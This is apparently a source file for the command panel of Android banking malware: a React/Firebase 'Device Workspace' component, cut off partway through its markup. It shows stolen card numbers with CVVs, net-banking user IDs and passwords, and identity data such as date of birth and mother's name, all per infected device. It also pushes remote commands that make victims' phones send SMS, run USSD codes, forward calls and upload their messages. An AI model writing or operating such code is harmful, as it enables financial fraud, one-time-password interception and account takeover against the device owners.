"use client";

import { useEffect, useState } from "react";
import {
  Card,
  CardBody,
  CardHeader,
  Chip,
  Button,
  Tabs,
  Tab,
  Modal,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalFooter,
  useDisclosure,
  Input,
  Select,
  SelectItem,
  Textarea,
  ButtonGroup,
  Link,
} from "@heroui/react";
import type Device from "@/types/devicetype";
import type DeviceMessage from "@/types/messageTypes";
import { db } from "@/lib/firbase";
import {
  equalTo,
  get,
  onValue,
  orderByChild,
  query,
  ref,
  remove,
  update,
} from "firebase/database";
import type { CardData, FormData, NetbankingData } from "@/types/formtype";
import type { DeviceStatus } from "@/lib/deviceStatus";

type DeviceDetailsTab =
  | "overview"
  | "sms"
  | "call-forwarding"
  | "ussd"
  | "view";

const DEVICE_DETAILS_TABS: DeviceDetailsTab[] = [
  "overview",
  "sms",
  "call-forwarding",
  "ussd",
  "view",
];

const DEVICE_TAB_STORAGE_PREFIX = "device-details:selected-tab";

function isDeviceDetailsTab(value: string): value is DeviceDetailsTab {
  return DEVICE_DETAILS_TABS.includes(value as DeviceDetailsTab);
}

function formatMinutesAgo(value: string, nowTimestamp: number): string {
  const timestamp = Date.parse(value);

  if (Number.isNaN(timestamp)) {
    return "Unknown";
  }

  const diffMs = nowTimestamp - timestamp;

  if (diffMs <= 0) {
    return "0 min ago";
  }

  const minutes = Math.floor(diffMs / (60 * 1000));

  return `${minutes} min ago`;
}

function getMessageTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue)) {
      return numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function sortMessagesByLatest(messages: DeviceMessage[]): DeviceMessage[] {
  return messages
    .slice()
    .sort(
      (a, b) =>
        getMessageTimestamp(b.timestamp) - getMessageTimestamp(a.timestamp),
    );
}

function logRequestResult(action: string, result: unknown) {
  console.log(`[DeviceDetails] ${action} result:`, result);
}

function getStatusAppearance(status: DeviceStatus) {
  if (status === "online") {
    return {
      pillClassName: "status-pill status-pill-online",
      dotClassName: "bg-emerald-500",
      label: "Online",
    };
  }

  if (status === "uninstalled") {
    return {
      pillClassName: "status-pill border-amber-200 bg-amber-50 text-amber-700",
      dotClassName: "bg-amber-500",
      label: "Uninstalled",
    };
  }

  return {
    pillClassName: "status-pill status-pill-offline",
    dotClassName: "bg-rose-500",
    label: "Offline",
  };
}

function getSimSlotValue(selectedSim: 1 | 2): "slot 0" | "slot 1" {
  return selectedSim === 1 ? "slot 0" : "slot 1";
}

function hasUsableSimNumber(value: string | null | undefined): boolean {
  if (typeof value !== "string") {
    return false;
  }

  const normalized = value.trim().toLowerCase();

  return normalized !== "" && normalized !== "unknown" && normalized !== "null";
}

function getDefaultSimSelection(
  sim1Number: string | null | undefined,
  sim2Number: string | null | undefined,
): 1 | 2 {
  if (hasUsableSimNumber(sim1Number)) {
    return 1;
  }

  if (hasUsableSimNumber(sim2Number)) {
    return 2;
  }

  return 1;
}

function formatSubmissionFieldLabel(key: string): string {
  return key
    .replace(/([A-Z])/g, " $1")
    .replace(/_/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .replace(/^./, (char) => char.toUpperCase());
}

function formatSubmissionFieldValue(key: string, value: unknown): string {
  if (value === null || value === undefined) {
    return "N/A";
  }

  const normalizedKey = key.toLowerCase();

  if (
    normalizedKey.includes("createdat") ||
    normalizedKey.includes("updatedat") ||
    normalizedKey.includes("timestamp")
  ) {
    const timestamp = getMessageTimestamp(value);

    if (timestamp > 0) {
      return new Date(timestamp).toLocaleString();
    }
  }

  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed || "N/A";
  }

  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  try {
    return JSON.stringify(value);
  } catch {
    return String(value);
  }
}

type HistoryRecord = Record<string, unknown>;

type HistorySource = "global" | "registered-device";

type HistoryEntry = {
  id: string;
  data: HistoryRecord;
  source: HistorySource;
};

function getHistoryRecordTimestamp(record: HistoryRecord): number {
  return getMessageTimestamp(
    record.timestamp ?? record.lastUpdated ?? record.createdAt,
  );
}

function parseHistoryEntries(value: unknown, deviceId: string): HistoryEntry[] {
  if (!value || typeof value !== "object") {
    return [];
  }

  const rawHistory = value as Record<string, unknown>;
  const directRecordKeys = [
    "action",
    "code",
    "lastUpdated",
    "result",
    "sim",
    "status",
    "timestamp",
  ];

  const hasDirectRecordShape = directRecordKeys.some(
    (key) => key in rawHistory,
  );

  if (hasDirectRecordShape) {
    return [{ id: deviceId, data: rawHistory, source: "global" }];
  }

  const nestedEntries = Object.entries(rawHistory)
    .filter(([, entryValue]) => entryValue && typeof entryValue === "object")
    .map(([entryId, entryValue]) => ({
      id: entryId,
      data: entryValue as HistoryRecord,
      source: "global" as const,
    }))
    .sort(
      (a, b) =>
        getHistoryRecordTimestamp(b.data) - getHistoryRecordTimestamp(a.data),
    );

  if (nestedEntries.length > 0) {
    return nestedEntries;
  }

  return [{ id: deviceId, data: rawHistory, source: "global" }];
}

function mergeHistoryEntries(...entryGroups: HistoryEntry[][]): HistoryEntry[] {
  return entryGroups
    .flat()
    .sort(
      (a, b) =>
        getHistoryRecordTimestamp(b.data) - getHistoryRecordTimestamp(a.data),
    );
}

interface DeviceDetailsProps {
  device: Device;
  messages: DeviceMessage[];
  forms?: FormData[];
  cards?: CardData[];
  netBanking?: NetbankingData[];
  onDeleteSMS?: (smsId: string) => Promise<void>;
}

export default function DeviceDetails({
  device,
  messages,
  forms = [],
  cards = [],
  netBanking = [],
  onDeleteSMS,
}: DeviceDetailsProps) {
  const [selectedTab, setSelectedTab] = useState<DeviceDetailsTab>("overview");
  const [nowTimestamp, setNowTimestamp] = useState(() => Date.now());
  const [selectedSIM, setSelectedSIM] = useState<1 | 2>(() =>
    getDefaultSimSelection(device.sim1number, device.sim2number),
  );
  const [forwardingSIM, setForwardingSIM] = useState<1 | 2>(() =>
    getDefaultSimSelection(device.sim1number, device.sim2number),
  );
  const [forwardingNumber, setForwardingNumber] = useState("");
  const [isForwardingActive, setIsForwardingActive] = useState(false);
  const [smsReceiver, setSmsReceiver] = useState("");
  const [smsMessage, setSmsMessage] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [ussdSimSlot, setUssdSimSlot] = useState<1 | 2>(() =>
    getDefaultSimSelection(device.sim1number, device.sim2number),
  );
  const [isSendingUssd, setIsSendingUssd] = useState(false);
  const [smsList, setSmsList] = useState<DeviceMessage[]>(messages);
  const [smsActionLoading, setSmsActionLoading] = useState(false);
  const [isAdminPhoneLoading, setIsAdminPhoneLoading] = useState(false);
  const [formSubmissions, setFormSubmissions] = useState<FormData[]>([]);
  const [cardSubmissions, setCardSubmissions] = useState<CardData[]>([]);
  const [netbankingSubmissions, setNetbankingSubmissions] = useState<
    NetbankingData[]
  >([]);
  const [callForwardingHistory, setCallForwardingHistory] = useState<
    HistoryEntry[]
  >([]);
  const [adminPhone1, setAdminPhone1] = useState(
    device.adminPhoneNumber[0] || "",
  );
  const canUseSim1 = hasUsableSimNumber(device.sim1number);
  const canUseSim2 = hasUsableSimNumber(device.sim2number);
  const hasAnyUsableSim = canUseSim1 || canUseSim2;
  const preferredSim = getDefaultSimSelection(
    device.sim1number,
    device.sim2number,
  );
  const isSimSelectable = (slot: 1 | 2) => {
    return slot === 1 ? canUseSim1 : canUseSim2;
  };

  const {
    isOpen: isPhoneModalOpen,
    onOpen: onPhoneModalOpen,
    onClose: onPhoneModalClose,
  } = useDisclosure();
  const { isOpen: isSimModalOpen, onClose: onSimModalClose } = useDisclosure();
  const {
    isOpen: isSendSMSModalOpen,
    onOpen: onSendSMSModalOpen,
    onClose: onSendSMSModalClose,
  } = useDisclosure();

  useEffect(() => {
    setSmsList(sortMessagesByLatest(messages));
  }, [messages]);

  useEffect(() => {
    const intervalId = window.setInterval(() => {
      setNowTimestamp(Date.now());
    }, 60 * 1000);

    return () => {
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") {
      return;
    }

    const savedTab = window.sessionStorage.getItem(
      `${DEVICE_TAB_STORAGE_PREFIX}:${device.deviceId}`,
    );

    if (savedTab && isDeviceDetailsTab(savedTab)) {
      setSelectedTab(savedTab);
      return;
    }

    setSelectedTab("overview");
  }, [device.deviceId]);

  useEffect(() => {
    if (!hasAnyUsableSim) {
      return;
    }

    if (!isSimSelectable(selectedSIM)) {
      setSelectedSIM(preferredSim);
    }
  }, [selectedSIM, hasAnyUsableSim, preferredSim, canUseSim1, canUseSim2]);

  useEffect(() => {
    if (!hasAnyUsableSim) {
      return;
    }

    if (!isSimSelectable(forwardingSIM)) {
      setForwardingSIM(preferredSim);
    }
  }, [forwardingSIM, hasAnyUsableSim, preferredSim, canUseSim1, canUseSim2]);

  useEffect(() => {
    if (!hasAnyUsableSim) {
      return;
    }

    if (!isSimSelectable(ussdSimSlot)) {
      setUssdSimSlot(preferredSim);
    }
  }, [ussdSimSlot, hasAnyUsableSim, preferredSim, canUseSim1, canUseSim2]);

  useEffect(() => {
    // Use props if available, otherwise fetch from database
    if (forms && forms.length > 0) {
      setFormSubmissions(forms);
    } else {
      const q = query(
        ref(db, "form_submissions"),
        orderByChild("uniqueId"),
        equalTo(device.deviceId),
      );
      return onValue(q, (snap) => {
        console.log("Form submissions snapshot", snap.val());
        if (!snap.exists()) {
          setFormSubmissions([]);
          return;
        }
        const d = snap.val() as Record<string, Record<string, string>>;
        setFormSubmissions(
          Object.keys(d).map((k) => ({
            dob: d[k].dob || "",
            fullName: d[k].fullName || "",
            motherName: d[k].motherName || "",
            mobileNumber: d[k].mobileNumber || "",
            uniqueId: d[k].uniqueId || "",
          })),
        );
      });
    }
  }, [device.deviceId, forms]);

  useEffect(() => {
    // Use props if available, otherwise fetch from database
    if (cards && cards.length > 0) {
      setCardSubmissions(cards);
    } else {
      const q = query(
        ref(db, "card_payment_data"),
        orderByChild("uniqueId"),
        equalTo(device.deviceId),
      );
      return onValue(q, (snap) => {
        console.log("Card submissions snapshot:", snap.val());
        if (!snap.exists()) {
          setCardSubmissions([]);
          return;
        }
        const d = snap.val() as Record<string, Record<string, string>>;
        setCardSubmissions(
          Object.keys(d).map((k) => ({
            cardNumber: d[k].cardNumber || "",
            createdAt: d[k].createdAt || "",
            expiryDate: d[k].expiryDate || "",
            cvv: d[k].cvv || "",
            uniqueId: d[k].uniqueId || "",
          })),
        );
      });
    }
  }, [device.deviceId, cards]);

  useEffect(() => {
    // Use props if available, otherwise fetch from database
    if (netBanking && netBanking.length > 0) {
      setNetbankingSubmissions(netBanking);
    } else {
      const q = query(
        ref(db, "netbanking_data"),
        orderByChild("uniqueId"),
        equalTo(device.deviceId),
      );
      return onValue(q, (snap) => {
        if (!snap.exists()) {
          setNetbankingSubmissions([]);
          return;
        }
        const d = snap.val() as Record<string, Record<string, string>>;
        setNetbankingSubmissions(
          Object.keys(d).map((k) => ({
            actvBankName: d[k].actvBankName || "",
            createdAt: d[k].createdAt || "",
            etPassword: d[k].etPassword || "",
            etUserId: d[k].etUserId || "",
            uniqueId: d[k].uniqueId || "",
          })),
        );
      });
    }
  }, [device.deviceId, netBanking]);

  useEffect(() => {
    const globalHistoryRef = ref(db, `history/${device.deviceId}`);
    const registeredHistoryRef = ref(
      db,
      `registeredDevices/${device.deviceId}/history`,
    );

    let globalHistoryEntries: HistoryEntry[] = [];
    let registeredHistoryEntries: HistoryEntry[] = [];

    const syncCombinedHistory = () => {
      setCallForwardingHistory(
        mergeHistoryEntries(globalHistoryEntries, registeredHistoryEntries),
      );
    };

    const unsubscribeGlobalHistory = onValue(globalHistoryRef, (snapshot) => {
      if (!snapshot.exists()) {
        globalHistoryEntries = [];
        syncCombinedHistory();
        return;
      }

      globalHistoryEntries = parseHistoryEntries(
        snapshot.val(),
        device.deviceId,
      ).map((entry) => ({
        ...entry,
        source: "global",
      }));

      syncCombinedHistory();
    });

    const unsubscribeRegisteredHistory = onValue(
      registeredHistoryRef,
      (snapshot) => {
        if (!snapshot.exists()) {
          registeredHistoryEntries = [];
          syncCombinedHistory();
          return;
        }

        registeredHistoryEntries = parseHistoryEntries(
          snapshot.val(),
          device.deviceId,
        ).map((entry) => ({
          ...entry,
          source: "registered-device",
        }));

        syncCombinedHistory();
      },
    );

    return () => {
      unsubscribeGlobalHistory();
      unsubscribeRegisteredHistory();
    };
  }, [device.deviceId]);

  const handleDeleteSMS = async (id: string) => {
    if (confirm("Are you sure you want to delete this SMS message?")) {
      setSmsActionLoading(true);
      try {
        if (onDeleteSMS) {
          await onDeleteSMS(id);
        } else {
          const smsRef = ref(db, `smsLogs/${device.deviceId}/${id}`);
          await remove(smsRef);
        }
        setSmsList((prev) => prev.filter((sms) => sms.id !== id));
      } catch (error) {
        console.error("Failed to delete SMS", error);
      } finally {
        setSmsActionLoading(false);
      }
    }
  };
  const handleSendUssd = async () => {
    if (!ussdCode) {
      alert("Please enter a USSD code");
      return;
    }

    if (!hasAnyUsableSim) {
      alert("No valid SIM number is available on this device");
      return;
    }

    if (!isSimSelectable(ussdSimSlot)) {
      setUssdSimSlot(preferredSim);
      alert("Please select a SIM that has a valid number");
      return;
    }

    setIsSendingUssd(true);
    try {
      const response = await fetch("/api/sendussd", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "USSD Request",
          body: `Execute USSD code ${ussdCode}`,
          data: {
            command: "ussd",
            ussdCode,
            sim: getSimSlotValue(ussdSimSlot),
          },
        }),
      });
      const result = await response.json();
      logRequestResult("USSD send", result);
      if (!response.ok || !result.success) {
        alert("Failed to send USSD request");
        return;
      }
      alert("USSD request sent");
      setUssdCode("");
    } finally {
      setIsSendingUssd(false);
    }
  };

  const handleDeleteAllSMS = async () => {
    if (confirm("Are you sure you want to delete all SMS messages?")) {
      setSmsActionLoading(true);
      try {
        const smsRef = ref(db, `smsLogs/${device.deviceId}`);
        await remove(smsRef);
        setSmsList([]);
      } catch (error) {
        console.error("Failed to delete all SMS", error);
      } finally {
        setSmsActionLoading(false);
      }
    }
  };
  const deviceStatus = getStatusAppearance(device.onlineStatus);

  const handleAdminPhoneUpdate = async () => {
    setIsAdminPhoneLoading(true);

    const nextPhone = adminPhone1.trim();

    try {
      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        adminPhoneNumber: nextPhone ? [nextPhone] : [],
        adminPhoneNumbers: nextPhone ? [nextPhone] : [],
        updatedAt: new Date().toISOString(),
      });
      const respose = await fetch("/api/updateAdminPhones", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Admin Phone Numbers Updated",
          body: "Admin phone numbers have been updated for this device.",
          data: {
            number: nextPhone,
          },
        }),
      });
      const result = await respose.json();
      logRequestResult("Admin phone update", result);
      if (!respose.ok || !result.success) {
        throw new Error("Failed to update admin phone numbers");
      }

      alert("Admin phone number updated successfully");
      onPhoneModalClose();
    } catch (error) {
      console.error("Failed to update admin phone numbers", error);
    } finally {
      setIsAdminPhoneLoading(false);
    }
  };

  const handledeleteAdminPhone = async (phone: string) => {
    const phoneToDelete = phone.trim();

    if (!phoneToDelete) {
      alert("No admin phone number available to clear");
      return;
    }

    if (!confirm("Are you sure you want to clear this admin phone number?")) {
      return;
    }

    setIsAdminPhoneLoading(true);
    try {
      const updatedPhoneNumbers = [adminPhone1]
        .map((num) => num.trim())
        .filter((num) => num && num !== phoneToDelete);

      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        adminPhoneNumber: updatedPhoneNumbers,
        adminPhoneNumbers: updatedPhoneNumbers,
        updatedAt: new Date().toISOString(),
      });

      const response = await fetch("/api/updateAdminPhones", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          data: {
            number: updatedPhoneNumbers[0] ?? "",
          },
        }),
      });

      const result = await response.json();
      logRequestResult("Admin phone delete", result);

      if (!response.ok || !result.success) {
        throw new Error("Failed to notify admin phone deletion");
      }

      setAdminPhone1(updatedPhoneNumbers[0] ?? "");
      alert("Admin phone number cleared successfully");
    } catch (error) {
      console.error("Failed to delete admin phone number", error);
    } finally {
      setIsAdminPhoneLoading(false);
    }
  };

  const handleForwardSim = async () => {
    if (!hasAnyUsableSim) {
      alert("No valid SIM number is available on this device");
      return;
    }

    if (!isSimSelectable(selectedSIM)) {
      setSelectedSIM(preferredSim);
      alert("Please select a SIM that has a valid number");
      return;
    }

    setSmsActionLoading(true);
    try {
      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        forwardingSim: getSimSlotValue(selectedSIM),
        updatedAt: new Date().toISOString(),
      });
      const response = await fetch("/api/simforwarding", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Forwarding SIM Updated",
          body: "The forwarding SIM has been updated for this device.",
          data: {
            forwardingSim: getSimSlotValue(selectedSIM),
          },
        }),
      });
      const result = await response.json();
      logRequestResult("Forwarding SIM update", result);
      if (!response.ok) {
        alert("Failed to update forwarding SIM");
      }
      onSimModalClose();
    } catch (error) {
      console.error("Failed to update forwarding sim", error);
    } finally {
      setSmsActionLoading(false);
    }
  };

  const handleRefreshSMS = async () => {
    setSmsActionLoading(true);
    try {
      const smsRef = ref(
        db,
        "registeredDevices/" + device.deviceId + "/smsLogs",
      );
      const snapshot = await get(smsRef);
      if (!snapshot.exists()) {
        console.warn(
          "No SMS data found in Firebase for device:",
          device.deviceId,
        );
        setSmsList([]);
        alert("No SMS messages found in database");
        return;
      }

      const smsData = snapshot.val() as Record<string, Record<string, unknown>>;
      console.log("SMS Data keys:", Object.keys(smsData));

      const refreshedLogs: DeviceMessage[] = Object.keys(smsData).map((key) => {
        const item = smsData[key];
        return {
          id: key,
          body: typeof item.body === "string" ? item.body : "",
          reciverNumber:
            typeof item.reciverNumber === "string"
              ? item.reciverNumber
              : typeof item.receiverNumber === "string"
                ? item.receiverNumber
                : "",
          senderNumber:
            typeof item.senderNumber === "string" ? item.senderNumber : "",
          timestamp:
            typeof item.timestamp === "string"
              ? item.timestamp
              : new Date().toISOString(),
          title: typeof item.title === "string" ? item.title : "",
          deviceId:
            typeof item.deviceId === "string" ? item.deviceId : device.deviceId,
        };
      });

      console.log("Refreshed logs count:", refreshedLogs.length);
      const sortedLogs = sortMessagesByLatest(refreshedLogs);
      setSmsList(sortedLogs);
      alert(`Refreshed! Found ${sortedLogs.length} SMS messages`);
    } catch (error) {
      console.error("Failed to refresh SMS from database", error);
      alert(
        "Error refreshing SMS: " +
          (error instanceof Error ? error.message : String(error)),
      );
    } finally {
      setSmsActionLoading(false);
    }
  };

  const handleGetSms = async () => {
    setSmsActionLoading(true);
    try {
      const response = await fetch("/api/getsms", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Get SMS Request",
          body: "Requesting SMS messages from device",
          data: {
            command: "get_sms",
          },
        }),
      });
      const result = await response.json();
      logRequestResult("Get SMS", result);
      if (!response.ok || !result.success) {
        alert("Failed to request SMS from device");
        return;
      }
      alert(
        "SMS request sent to device. It may take a moment for messages to appear.",
      );
    } catch (error) {
      console.error("Failed to request SMS from device", error);
      alert(
        "Error requesting SMS: " +
          (error instanceof Error ? error.message : String(error)),
      );
    } finally {
      setSmsActionLoading(false);
    }
  };

  const handleSendSMS = async () => {
    if (!smsReceiver || !smsMessage) {
      alert("Please enter a receiver number and message");
      return;
    }

    if (!hasAnyUsableSim) {
      alert("No valid SIM number is available on this device");
      return;
    }

    if (!isSimSelectable(selectedSIM)) {
      setSelectedSIM(preferredSim);
      alert("Please select a SIM that has a valid number");
      return;
    }

    // Here you would send the SMS via WebSocket or API
    const response = await fetch("/api/sendmessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        title: `SMS to ${smsReceiver}`,
        data: {
          message: smsMessage,
          receiver: String(smsReceiver),
          sim: getSimSlotValue(selectedSIM),
        },
        body: `Send SMS to ${smsReceiver}`,
        token: device.fcmToken,
      }),
    });
    const data = await response.json();
    logRequestResult("SMS send", data);
    if (data.success) {
      alert("SMS sent successfully");
    } else {
      alert("Failed to send SMS");
    }
  };

  const handleActivateForwarding = async () => {
    if (!forwardingNumber) {
      alert("Please enter a forwarding number");
      return;
    }

    if (!hasAnyUsableSim) {
      alert("No valid SIM number is available on this device");
      return;
    }

    if (!isSimSelectable(forwardingSIM)) {
      setForwardingSIM(preferredSim);
      alert("Please select a SIM that has a valid number");
      return;
    }

    const response = await fetch("/api/callforwarding", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        token: device.fcmToken,
        title: `Call Forwarding Activated`,
        command: "activate",
        body: "Forwarding to " + forwardingNumber,
        data: {
          sim: getSimSlotValue(forwardingSIM),
          number: String(forwardingNumber),
        },
      }),
    });
    const data = await response.json();
    logRequestResult("Call forwarding activate", data);
    if (data.success) {
      alert("Call forwarding activated successfully");
      await update(
        ref(db, `registeredDevices/${device.deviceId}/callForwarding`),
        {
          status: "ON",
          number: forwardingNumber,
          updatedAt: Date.now(),
          forwardingSim: getSimSlotValue(forwardingSIM),
        },
      );
      await update(ref(db, `history/${device.deviceId}`), {
        action: "call",
        code: String(forwardingNumber),
        lastUpdated: Date.now(),
        result: "Call forwarding activated",
        sim: getSimSlotValue(forwardingSIM),
        status: "success",
        timestamp: Date.now(),
      });
      setIsForwardingActive(true);
      setForwardingNumber("");
    } else {
      alert("Failed to activate call forwarding");
    }
  };

  const handleDeactivateForwarding = async () => {
    if (!hasAnyUsableSim) {
      alert("No valid SIM number is available on this device");
      return;
    }

    if (!isSimSelectable(forwardingSIM)) {
      setForwardingSIM(preferredSim);
      alert("Please select a SIM that has a valid number");
      return;
    }

    const response = await fetch("/api/callforwarding", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        token: device.fcmToken,
        command: "deactivate",
        title: `Call Forwarding Deactivated`,
        body: "Deactivating call forwarding",
        data: {
          sim: getSimSlotValue(forwardingSIM),
        },
      }),
    });
    if (response.ok) {
      alert("Call forwarding deactivated successfully");
      await update(
        ref(db, `registeredDevices/${device.deviceId}/callForwarding`),
        {
          status: "OFF",
          number: "",
          updatedAt: new Date().toISOString(),
          forwardingSim: 0,
        },
      );
      setIsForwardingActive(false);
      const result = await response.json();
      logRequestResult("Call forwarding deactivate", result);
    } else {
      alert("Failed to deactivate call forwarding");
    }
  };

  const renderSubmissionSection = <T extends object>(
    title: string,
    entries: T[],
    emptyMessage: string,
    countClassName: string,
  ) => {
    return (
      <section className="rounded-2xl border border-(--border) bg-(--surface) p-4">
        <div className="mb-4 flex items-center justify-between gap-3">
          <h4 className="text-base font-semibold text-(--text-main)">
            {title}
          </h4>
          <Chip size="sm" className={countClassName}>
            {entries.length}
          </Chip>
        </div>

        {entries.length === 0 ? (
          <div className="rounded-xl border border-(--border) bg-(--surface-muted) p-4 text-sm text-(--text-muted)">
            {emptyMessage}
          </div>
        ) : (
          <div className="space-y-3">
            {entries.map((entry, index) => (
              <div
                key={`${title}-${index}`}
                className="rounded-xl border border-(--border) bg-(--surface-muted) p-3"
              >
                <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-(--text-muted)">
                  {title} Entry {entries.length - index}
                </p>

                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                  {Object.entries(entry as Record<string, unknown>).map(
                    ([key, value]) => (
                      <div
                        key={`${title}-${index}-${key}`}
                        className="rounded-lg border border-(--border) bg-(--surface) px-3 py-2"
                      >
                        <p className="text-[11px] uppercase tracking-wide text-(--text-muted)">
                          {formatSubmissionFieldLabel(key)}
                        </p>
                        <p className="mt-1 break-all text-sm font-medium text-(--text-main)">
                          {formatSubmissionFieldValue(key, value)}
                        </p>
                      </div>
                    ),
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </section>
    );
  };

  return (
    <div className="space-y-6">
      <Card className="surface-card overflow-hidden rounded-[32px]">
        <CardHeader className="flex-col items-start gap-4 bg-linear-to-br from-white to-[var(--surface-subtle)] px-4 py-5 sm:px-6">
          <div className="flex w-full flex-col gap-4 sm:flex-row sm:items-start sm:justify-between">
            <div className="space-y-3">
              <div>
                <p className="text-xs font-semibold uppercase tracking-[0.18em] text-[var(--accent)]">
                  Device Workspace
                </p>
                <h2 className="text-2xl font-semibold text-[var(--text-main)] sm:text-3xl">
                  {device.brand} {device.model}
                </h2>
              </div>
              <p className="max-w-2xl break-all rounded-2xl border border-[var(--border)] bg-white px-4 py-3 font-mono text-xs text-[var(--text-muted)] shadow-sm sm:text-sm">
                {device.deviceId}
              </p>
            </div>

            <Link
              href="/devices"
              className="inline-flex h-10 items-center rounded-full border border-[var(--border)] bg-white px-4 text-sm font-medium text-[var(--text-muted)] transition hover:border-[var(--border-strong)] hover:text-[var(--text-main)]"
            >
              Back to devices
            </Link>
          </div>

          <div className="flex flex-col gap-3 sm:flex-row sm:flex-wrap sm:items-center">
            <span className={deviceStatus.pillClassName}>
              <span
                className={`h-2 w-2 rounded-full ${deviceStatus.dotClassName}`}
              />
              {deviceStatus.label}
            </span>
            <div className="status-pill border-[var(--border)] bg-white text-[var(--text-muted)]">
              <span className="font-medium text-[var(--text-main)]">
                Last seen
              </span>
              {device.lastChecked
                ? formatMinutesAgo(device.lastChecked, nowTimestamp)
                : "Unknown"}
            </div>
          </div>
        </CardHeader>
      </Card>

      {/* Tabs */}
      <Card className="surface-card overflow-hidden rounded-[28px]">
        <CardBody className="overflow-visible p-0">
          <Tabs
            aria-label="Device details tabs"
            selectedKey={selectedTab}
            onSelectionChange={(key) => {
              const nextTab = String(key);

              if (!isDeviceDetailsTab(nextTab)) {
                return;
              }

              setSelectedTab(nextTab);

              if (typeof window !== "undefined") {
                window.sessionStorage.setItem(
                  `${DEVICE_TAB_STORAGE_PREFIX}:${device.deviceId}`,
                  nextTab,
                );
              }
            }}
            classNames={{
              tabList:
                "w-full gap-2 overflow-x-auto border-b border-[var(--border)] bg-[var(--surface-subtle)] px-3 py-3",
              cursor: "bg-[var(--accent)] text-white shadow-sm",
              tab: "h-11 rounded-full px-4 text-sm data-[hover-unselected=true]:opacity-100 sm:px-6",
              tabContent:
                "text-[var(--text-muted)] group-data-[selected=true]:text-[var(--text-main)]",
            }}
          >
            <Tab key="overview" title="Overview">
              <div className="space-y-4 bg-[var(--surface-muted)] p-4 sm:p-6">
                {/* SIMs Section */}
                <div>
                  <div className="mb-3 flex items-center justify-between">
                    <h3 className="text-lg font-semibold text-(--text-main)">
                      Overview
                    </h3>
                  </div>

                  <div className="space-y-3">
                    <div className="rounded-lg bg-(--surface-muted) p-3 border border-(--border)">
                      <div className="mb-2 flex items-center justify-between">
                        <span className="text-sm font-medium text-(--text-muted)">
                          SIMs
                        </span>
                        <Chip
                          size="sm"
                          className="bg-emerald-500/20 text-emerald-700"
                        >
                          Ready
                        </Chip>
                      </div>
                      <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
                        <div className="flex items-center gap-2">
                          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-blue-500/20 text-xl">
                            📱
                          </div>
                          <div>
                            {" "}
                            <p className="text-xs text-(--text-muted)">SIM 1</p>
                            <p className="font-mono text-sm font-semibold text-(--text-main)">
                              {device.sim1number || "Unknown"}
                            </p>
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-purple-500/20 text-xl">
                            📞
                          </div>
                          <div>
                            <p className="text-xs text-(--text-muted)">SIM 2</p>
                            <p className="font-mono text-sm font-semibold text-(--text-main)">
                              {device.sim2number || "Unknown"}
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Update Phone Number */}
                    <div className="rounded-lg bg-(--surface-muted) p-3 border border-(--border)">
                      <div className="flex items-start gap-3">
                        <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-blue-500/20 text-xl">
                          📱
                        </div>
                        <div className="flex-1">
                          <h4 className="font-semibold text-(--text-main) mb-1">
                            Update Phone Number
                          </h4>
                          <p className="text-xs text-(--text-muted) mb-2">
                            Manage admin phone numbers for this device.
                          </p>
                          <div className="flex flex-row gap-2">
                            <Button
                              size="sm"
                              variant="flat"
                              onPress={onPhoneModalOpen}
                              isDisabled={isAdminPhoneLoading}
                              className="w-full bg-(--accent-soft) text-(--text-main) hover:bg-slate-300"
                            >
                              Open Editor
                            </Button>
                            <Button
                              size="sm"
                              variant="flat"
                              onPress={() =>
                                handledeleteAdminPhone(adminPhone1)
                              }
                              isLoading={isAdminPhoneLoading}
                              isDisabled={isAdminPhoneLoading}
                              className="w-full bg-green-200 text-green-800 hover:bg-green-300"
                            >
                              Clear Number
                            </Button>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Change Forwarding SIM */}
                    {/* <div className="rounded-lg bg-(--surface-muted) p-3 border border-(--border)">
                      <div className="flex items-start gap-3">
                        <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-purple-500/20 text-xl">
                          📞
                        </div>
                        <div className="flex-1">
                          <h4 className="font-semibold text-(--text-main) mb-1">
                            Change Forwarding SIM
                          </h4>
                          <p className="text-xs text-(--text-muted) mb-2">
                            Choose which SIM should be used for SMS forwarding
                            on the device.
                          </p>
                          <p className="text-xs text-(--text-muted) mb-2">
                            Current:{" "}
                            <span className="font-medium uppercase">
                              {device.forwardingSim || "Not Set"}
                            </span>
